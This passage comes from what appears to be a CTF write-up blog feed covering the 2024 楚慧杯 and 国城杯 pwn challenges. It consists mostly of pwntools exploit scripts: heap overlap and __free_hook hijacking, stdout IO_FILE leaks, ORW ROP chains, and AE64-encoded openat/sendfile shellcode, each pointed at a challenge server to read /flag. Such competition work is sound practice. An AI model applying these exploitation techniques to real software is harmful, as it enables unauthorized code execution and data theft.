libc.sym[&#x27;read&#x27;]</span><br><span class="line">write_addr=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(8,0x18)</span><br><span class="line">add(9,0x58)</span><br><span class="line">add(10,0x58)</span><br><span class="line">add(11,0x18)</span><br><span class="line"></span><br><span class="line">edit(8,b&#x27;\x00&#x27;*0x18+p8(0xc1))</span><br><span class="line"></span><br><span class="line">free(9)</span><br><span class="line">add(12,0xb8)</span><br><span class="line">free(10)</span><br><span class="line">edit(12,b&#x27;\x00&#x27;*0x58+p64(0x61)+p64(free_hook))</span><br><span class="line">payload=(b&#x27;\x00&#x27;*0x68+p64(0)+p64(free_hook&amp;0xfffffffffffff000)+p64(0)*2+p64(0x2000)).ljust(0xa0,b&#x27;\x00&#x27;)+p64(free_hook&amp;0xfffffffffffff000)+p64(syscall)</span><br><span class="line">add(13,0x58)</span><br><span class="line">add(14,0x58)</span><br><span class="line">edit(14,p64(setcontext+53))</span><br><span class="line">add(15,0x400)</span><br><span class="line">edit(15,payload)</span><br><span class="line">#bug()</span><br><span class="line">free(15)</span><br><span class="line">pause()</span><br><span class="line">sleep(0.1)</span><br><span class="line">payload  = p64(rdi)+p64(free_hook&amp;0xfffffffffffff000)</span><br><span class="line">payload += p64(rsi)+p64(0x1000)</span><br><span class="line">payload += p64(rdx)+p64(7)</span><br><span class="line">payload += p64(rax)+p64(10)</span><br><span class="line">payload += p64(syscall) #mprotect(free_hook&amp;0xfffffffffffff000,0x1000,7)</span><br><span class="line">payload += p64(jmp_rsp)</span><br><span class="line">payload += asm(shellcraft.open(&#x27;/flag&#x27;))</span><br><span class="line">payload += asm(shellcraft.read(3,free_hook+0x300,0x30))</span><br><span class="line">payload += asm(shellcraft.write(1,free_hook+0x300,0x30))</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>environ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;139.155.126.78&#x27;,16215)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(i,size):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;Size:&quot;)</span><br><span class="line">sl(str(size))</span><br><span class="line">def edit(i,content):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">rl(&quot;context: &quot;)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">rl(&quot;index:&quot;)</span><br><span class="line">sl(str(i))</span><br><span class="line">def gift():</span><br><span class="line">rl(&quot;Your choice:&quot;)</span><br><span class="line">sl(str(4))</span><br><span class="line">rl(&quot;choose:&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line"></span><br><span class="line">add(0,0x18)  #0</span><br><span class="line">add(1,0x68)  #1</span><br><span class="line">add(2,0x68)  #2</span><br><span class="line">add(3,0x18)  #3</span><br><span class="line">edit(0,b&#x27;\x00&#x27;*0x18+p8(0xe1))</span><br><span class="line">free(1)</span><br><span class="line">add(4,0xd8)  </span><br><span class="line">gift()</span><br><span class="line">rl(b&#x27;0x&#x27;)</span><br><span class="line">pie_base=int(p.recv(12),16)-0x202160</span><br><span class="line">li(hex(pie_base))</span><br><span class="line">free(2)</span><br><span class="line">edit(4,b&#x27;\x00&#x27;*0x68+p64(0x71)+p64(pie_base+0x202020)) </span><br><span class="line">add(5,0x68)</span><br><span class="line">add(6,0x68)</span><br><span class="line">add(7,0x68)</span><br><span class="line">edit(7,p64(0xfbad1800) + p64(0)*3 + b&#x27;\x00&#x27;)</span><br><span class="line">libc_base=get_addr64()-0x3ed8b0</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">environ=libc_base+libc.sym[&#x27;environ&#x27;]</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">jmp_rsp=libc_base+libc.search(asm(&quot;jmp rsp&quot;)).__next__()</span><br><span class="line">free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">setcontext=libc_base+libc.sym[&#x27;setcontext&#x27;]+53</span><br><span class="line">open_addr=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read_addr=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write_addr=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">shell=p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)</span><br><span class="line">stdout_attack=p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+8)</span><br><span class="line">edit(7,stdout_attack)</span><br><span class="line">stack=get_addr64()-280</span><br><span class="line">li(hex(stack))</span><br><span class="line"></span><br><span class="line">add(8,0x18)</span><br><span class="line">add(9,0x58)</span><br><span class="line">add(10,0x58)</span><br><span class="line">add(11,0x18)</span><br><span class="line"></span><br><span class="line">edit(8,b&#x27;\x00&#x27;*0x18+p8(0xc1))</span><br><span class="line"></span><br><span class="line">free(9)</span><br><span class="line">add(12,0xb8)</span><br><span class="line">free(10)</span><br><span class="line">edit(12,b&#x27;\x00&#x27;*0x58+p64(0x61)+p64(stack-0x10))</span><br><span class="line">shell=p64(rdi)+p64(0)+p64(rsi)+p64(stack+64)+p64(rax)+p64(0)+p64(syscall)</span><br><span class="line">add(13,0x58)</span><br><span class="line">add(14,0x58)</span><br><span class="line">flag=stack</span><br><span class="line">reads=b&#x27;/flag\x00\x00\x00&#x27;*3+shell</span><br><span class="line">#bug()</span><br><span class="line">edit(14,reads)</span><br><span class="line"></span><br><span class="line">#pause()</span><br><span class="line">sleep(0.1)</span><br><span class="line">orw = p64(rdi) + p64(flag)  #/flag的字符串位置，要改</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(open_addr)</span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rdx) + p64(0x50)</span><br><span class="line">orw += p64(rsi)+p64(flag+0x500) #读入flag的位置</span><br><span class="line">orw += p64(read_addr)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rdx) + p64(0x50)</span><br><span class="line">orw += p64(rsi)+p64(flag+0x500) #读入flag的位置</span><br><span class="line">orw += p64(write_addr)</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="pwn1">pwn1</h3><p>源鲁杯原题</p><p>[Round 1] canary_orw</p><p>jmp rsp，直接给我们0x15字节的溢出，控制函数返回到vuln，并且执行jmp rsp，并写入shellcode，返回栈顶，构造read，读入orw，获取flag，中间有个任意地址写，写的时候忘了利用了，要不然出的更快</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">def s(a):</span><br><span class="line">    p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">    p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">    p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">    p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">    p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">    #print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">    return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">    p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">    return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">    return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">    return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">    return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">pr = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;challenge.yuanloo.com&#x27;,29329)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">vuln=0x400820</span><br><span class="line">jmp_rsp=0x40081B</span><br><span class="line">rl(&quot;Say some old spells to start the journey\n&quot;)</span><br><span class="line"></span><br><span class="line">payload =p64(vuln)+p64(jmp_rsp)</span><br><span class="line">payload+=asm(&#x27;&#x27;&#x27;</span><br><span class="line">xchg rsi,rsp</span><br><span class="line">jmp rsp</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">pr(hex(len(payload)))</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">rl(&quot;Tell me the location of the Eye of the Deep Sea\n&quot;)</span><br><span class="line">s(b&#x27;a&#x27;*8)</span><br><span class="line">rl(&quot;I have magic\n&quot;)</span><br><span class="line">payload=asm(&#x27;&#x27;&#x27;</span><br><span class="line">sub rsp,0x30</span><br><span class="line">jmp rsp</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">s(payload)</span><br><span class="line">rl(&quot;Let&#x27;s go!\n&quot;)</span><br><span class="line">payload=asm(&#x27;&#x27;&#x27;</span><br><span class="line">sub rsi,0x2a</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">pay=asm(&#x27;&#x27;&#x27;    </span><br><span class="line">    mov rax, 0x67616c662f2e</span><br><span class="line">    push rax</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    sub rdi, 100</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx</span><br><span class="line">    xor r10, r10</span><br><span class="line">    push SYS_openat</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rsi, 3</span><br><span class="line">    push 0</span><br><span class="line">    mov rdx, rsp</span><br><span class="line">    mov r10, 0x100</span><br><span class="line">    push SYS_sendfile</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h5 id=""></h5>]]></content>
    
    
    <summary type="html">2024楚慧杯</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2024国城杯</title>
    <link href="https://www.thir0th.xyz/posts/193fa7da.html"/>
    <id>https://www.thir0th.xyz/posts/193fa7da.html</id>
    <published>2025-04-20T06:39:35.000Z</published>
    <updated>2025-05-07T08:47:22.421Z</updated>
    
    <content type="html"><![CDATA[<h1>2024国城杯</h1><h3 id="线上">线上</h3><h4 id="Alpha-Shell">Alpha_Shell</h4><p>可见字符shellcode，并且开启沙盒，用openat+sendlife的shellcode，并用ae64转为可见字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="number">31890</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p, &quot;b *$rebase(0x15AF)&quot;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">rl(<span class="string">&quot;Radiant powers, deadly tech. Here we go!&quot;</span>)</span><br><span class="line">pay=(<span class="string">&#x27;&#x27;&#x27;    </span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">sub rdi, 100</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor r10, r10</span></span><br><span class="line"><span class="string">push SYS_openat</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 3</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">mov rdx, rsp</span></span><br><span class="line"><span class="string">mov r10, 0x100</span></span><br><span class="line"><span class="string">push SYS_sendfile</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(pay),<span class="string">&#x27;rdx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sc)</span><br><span class="line"></span><br><span class="line">s(sc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="beverage-store">beverage 